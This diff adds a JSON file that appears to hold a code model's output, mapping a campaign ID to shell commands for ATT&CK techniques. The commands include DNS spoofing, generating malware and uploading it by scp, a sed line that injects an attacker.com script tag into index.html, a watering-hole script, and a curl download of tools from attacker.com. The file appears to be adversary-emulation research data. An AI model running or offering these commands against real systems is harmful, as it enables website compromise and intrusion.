@@ -1,0 +1,94 @@
+{
+  "campaign_id": "C0010",
+  "model": "qwen2.5-coder:14b",
+  "sample": 1,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-spoofing",
+      "command": "dnsspoof -i eth0 -f spoof.conf",
+      "target": "actor.primary",
+      "parameters": {
+        "interface": "eth0",
+        "config_file": "spoof.conf"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "domain-compromise",
+      "command": "nsupdate -k /etc/bind/Kexample.com.+157+12345.key",
+      "target": "actor.primary",
+      "parameters": {
+        "key_file": "/etc/bind/Kexample.com.+157+12345.key"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "malware-development",
+      "command": "python3 malware_generator.py -o sugarush.exe",
+      "target": "runtime.python3",
+      "parameters": {
+        "output_file": "sugarush.exe"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "tool-acquisition",
+      "command": "git clone https://github.com/rapid7/metasploit-framework.git",
+      "target": "actor.primary",
+      "parameters": {
+        "repository_url": "https://github.com/rapid7/metasploit-framework.git"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "malware-upload",
+      "command": "scp sugarush.exe user@target.primary:/path/to/upload",
+      "target": "target.primary",
+      "parameters": {
+        "source_file": "sugarush.exe",
+        "destination_path": "/path/to/upload"
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "tool-upload",
+      "command": "scp metasploit-framework user@target.primary:/path/to/upload",
+      "target": "target.primary",
+      "parameters": {
+        "source_file": "metasploit-framework",
+        "destination_path": "/path/to/upload"
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "drive-by-compromise",
+      "command": "sed -i 's/</body>/<script src=\"http://attacker.com/malware.js\"></script></body>/' index.html",
+      "target": "web_asset.benign_landing",
+      "parameters": {
+        "file_path": "index.html",
+        "malware_url": "http://attacker.com/malware.js"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "watering-hole-compromise",
+      "command": "python3 watering_hole.py -u http://legitshippingcompany.com/login",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "http://legitshippingcompany.com/login"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "tool-transfer",
+      "command": "curl -o /path/to/tools.zip http://attacker.com/tools.zip",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://attacker.com/tools.zip",
+        "destination_path": "/path/to/tools.zip"
+      }
+    }
+  ]
+}
